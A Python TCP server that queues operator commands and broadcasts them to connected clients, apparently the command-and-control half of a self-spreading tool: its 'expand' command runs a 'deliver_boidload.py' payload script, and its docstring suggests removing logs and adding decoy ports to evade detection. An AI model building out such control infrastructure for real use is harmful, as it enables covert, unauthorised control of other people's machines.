#!/usr/bin/env python3
"""
    Allan Millar
    Server
    Massive credit to
    https://github.com/eliben/python3-samples/blob/3a533b22c97c54de22d9cf950a9a3247739eaddc/async/selectors-async-tcp-server.py
    From which I got the basic SelectorServer architecture.
    
    If this program were to ever be actually used, logging would need to be
    implemented differently. The safest option is removal, but the files could
    also be encrypted.
    
    Another maybe improvment could be opening decoy ports as well and
    seperating them from the program as much as possible.
"""
import sys, socket, selectors, logging, time, argparse, threading, os
from threading import Thread
from subprocess import Popen

keep_running = True

class Node:
    def __init__(self, data):
        """Node constructer class"""
        self.data = data
        self.next = None
        self.previous = None
        return
    
    def get_data(self):
        return self.data
    
    def set_data(self, data):
        self.data  = data
        return
    
    def data_equals(self, data):
        if self.data == data:
            return True
        else:
            return False

class CommandQueue:
    def __init__(self):
        """Doubly-linked list instantiator"""
        self.head = None
        self.tail = None
        return
    
    def list_length(self):
        """Returns number of nodes in list"""
        count = 0
        current_node = self.head
        while current_node is not None:
            count = count +1
            current_node = current_node.next
        
        return count
    
    def push(self, command):
        """Add command to front of queue"""
        new_node = Node(command)
        if self.head == None:
            self.head = new_node
            self.tail = new_node
        else:
            self.tail.next = new_node
            new_node.previous = self.tail
            self.tail = new_node
        return
    
    def pop(self):
        """Delete front node from queue"""
        if self.head == None:
            pass
        elif self.head == self.tail:
            self.head = None
            self.tail = None
        else:
            temp = self.head
            self.head = temp.next
            temp.next = None
            self.head.previous = None
        return
    
    def peek(self):
        """Returns front-most command (head-node's data)"""
        if self.head == None:
            return None
        else:
            return self.head.data
    
    def is_empty(self):
        """Returns boolean if queue is empty, i.e. no nodes"""
        if self.head == None:
            return True
        else:
            return False

class SelectorServer:
    def __init__(self, host, port):
        # Create the main socket that accepts incoming connections
        # and start listening. The socket is nonblocking.
        self.main_socket = socket.socket()
        self.main_socket.bind((host, port))
        self.main_socket.listen(20)
        self.main_socket.setblocking(False)
        self.queue = CommandQueue()
        self.command_phase = False
        
        # Initialize a default selector that will handle the events.
        # Register main_socket for monitoring, monitor READ events 
        # and READ events, and the handler method is passed in data
        # so we can fetch it in serve_forever. on_accept is the handler
        # method.
        self.selector = selectors.DefaultSelector()
        self.selector.register(fileobj = self.main_socket, 
            events = selectors.EVENT_READ | selectors.EVENT_WRITE, 
            data = self.on_accept
        )
        
        # Dictionary to keep track of peers. Maps socket file descriptor
        # to a peer name. A file descriptor is a handle used to access
        # the socket in this instance.
        self.current_peers = {}
    
    def on_accept(self, socket, mask):
        # This is a handler for main_socket, which is set to listen before
        # reaching this point, so we know it can accept new connections
        # I'm not sure why socket and mask are passed here.
        conn, addr = self.main_socket.accept()
        logging.info("accepted connection from {0}".format(addr))
        conn.setblocking(False)
        
        # Add connection to list of current peers.
        self.current_peers[conn.fileno()] = conn.getpeername()
        
        # Register interest in events specific to the new socket. 
        # To be handled by on_read.
        self.selector.register(fileobj = conn, 
            events = selectors.EVENT_READ | selectors.EVENT_WRITE, 
            data = self.on_read
        )
    
    def on_read(self, conn, mask):
        # This handles peer sockets, and is called when data is being
        # sent or received.
        # This also handles the various messages currently
        
        logging.info("Beginning of on read")
        
        # Check for messages from controller.
        if not self.queue.is_empty() and self.command_phase:
            # If there is a command to send and we're not just adding a client.
            logging.info("Attempting to send command to clients.")
            
            # Grab command
            command = self.queue.peek()
            
            logging.info("Command = {}".format(command))
            
            # Do command
            if command == "extract":
                logging.info("Extract command recognized")
                conn.sendall(command.encode())
                self.shutdown()
            elif command == "expand":
                logging.info("expand command recognized")
                Popen(["python3", "deliver_boidload.py"])
                conn.send(command.encode())
                """For now I am not going to worry about setting an expansion
                state to keep sending the command until stopped by the user.
                That would involve a lot that isn't strictly necessary right now."""
            elif command == "task":
                logging.info("task command recognized")
                # Call task script here?
                conn.send(command.encode())
            else:
                logging.info("Command not recognized")
                pass
        else:
            # If not, move on.
            pass
            #logging.debug("on read else statement")
        
        try:
            data = conn.recv(1024)
            if len(data) == 0:
                peername = conn.getpeername()
                logging.info("Connection lost from " + 
                    "{}: {!r}, deleting reference.".format(peername, data)
                )
                self.close_connection(conn)
            else:
                peername = conn.getpeername()
                logging.info("Data received from " + 
                    "{}: {!r}".format(peername, data)
                )
        except (ConnectionResetError, IOError):
            pass
    
    def close_connection(self, conn):
        # We can't ask conn for getpeername() here, because the peer 
        # may no longer exist (hung up); instead we use our own mapping
        # of socket fds to peer names - our socket fd is still open.  
        peername = self.current_peers[conn.fileno()]
        logging.info("Closing connection to {0}".format(peername))
        del self.current_peers[conn.fileno()]
        self.selector.unregister(conn)
        conn.close()
    
    def shutdown(self):
        global keep_running
        keep_running = False
        self.main_socket.shutdown(socket.SHUT_RDWR)
        self.main_socket.close()
    
    def serve_forever(self):
        logging.debug("Serve_forever reached")
        last_report_time = time.time()
        
        while keep_running:
                        
            # Wait until some registered socket becomes ready. 
            # This will block for 200 ms
            events = self.selector.select(timeout = 0.2)
            # For each new event, dispatch to its handler
            for key, mask in events:
                handler = key.data
                handler(key.fileobj, mask)
            
            if self.current_peers:
                # If there are any clients to command
                self.command_phase = True
                
                # Iterate back through all connections, this time sending a command
                # to each.
                events = self.selector.select()
                for key, mask in events:
                    callback = key.data
                    callback(key.fileobj, mask)
                
                self.command_phase = False
                
            elif self.queue.peek():
                logging.info("Command recognized with no clients flag")
                Popen(["python3", "deliver_boidload.py"])
            
            # Remove the front command which will now have been sent.
            self.queue.pop()
            
            logging.debug("Reached end of for loop in serve_forever.")
            # This part happens roughly every second
            current_time = time.time()
            if current_time - last_report_time > 1:
                logging.debug("Inside of if statement")
                logging.info("Running report ...")
                if (len(self.current_peers) > 0):
                    logging.info("Num active peers = {0}".format(
                        len(self.current_peers)))
                last_report_time = current_time
        logging.debug("Flag successfully changed, exiting serve_forever")

class ServerThread(Thread):
    def __init__(self, host, port):
        Thread.__init__(self)
        self.server = SelectorServer(host, port)
    
    def run(self):
        self.server.serve_forever()
    
    def add_command(self, command):
        self.server.queue.push(command)
        return

def main():
    logging.debug("Entered main method")
    parser = argparse.ArgumentParser(
        description=""
    )
    parser.add_argument("port", 
        help = "use the provided number as the port for the server", 
        type = int
    )
    parser.add_argument("ip", 
        help = "use the provided number as the ip address for the server", 
        type = str
    )
    args = parser.parse_args()
    host = args.ip
    port = args.port
    
    server_thread = ServerThread(host, port)
    server_thread.start()
    
    while True:
        command = input()
        dir_path = os.path.abspath("../silla")
        os.chdir(dir_path)
        logging.info("Received command {}".format(command))
        server_thread.add_command(command)
        # Wait for server to send command then
        time.sleep(0.5)
        if command == "exit":
            global keep_running
            keep_running = False
            break
    
    logging.info("Program closing")
    sys.exit(0)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, 
        filename="server.log", 
        filemode="w", 
        format="%(process)d - %(asctime)s -" + 
            "%(funcName)s - %(levelname)s -  %(message)s\n"
    )
    logging.info("starting")
    main()